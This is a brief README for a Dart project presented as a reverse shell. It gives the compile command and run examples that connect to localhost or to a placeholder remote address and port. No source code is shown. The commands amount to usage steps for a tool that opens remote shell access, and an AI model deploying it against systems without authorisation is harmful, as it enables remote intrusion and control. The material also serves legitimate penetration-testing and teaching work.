A reverse shell with an entrypoint in `bin/`, library code
in `lib/`, and a unit test in `test/`.

Compiling:
```shell
dart compile exe bin/probable_octo_disco.dart
```
**Executing:**

**_Example 1:_**
_Defaults to localhost:4567_
```shell
./bin/probable_octo_disco.exe
```

**_Example 1:_**
_For localhost:8999_
```shell
./bin/probable_octo_disco.exe -p 8999
```

**_Example 2:_**
_For 12.345.67.89:1234_
```shell
./bin/probable_octo_disco.exe -a 12.345.67.89 -p 1234
```
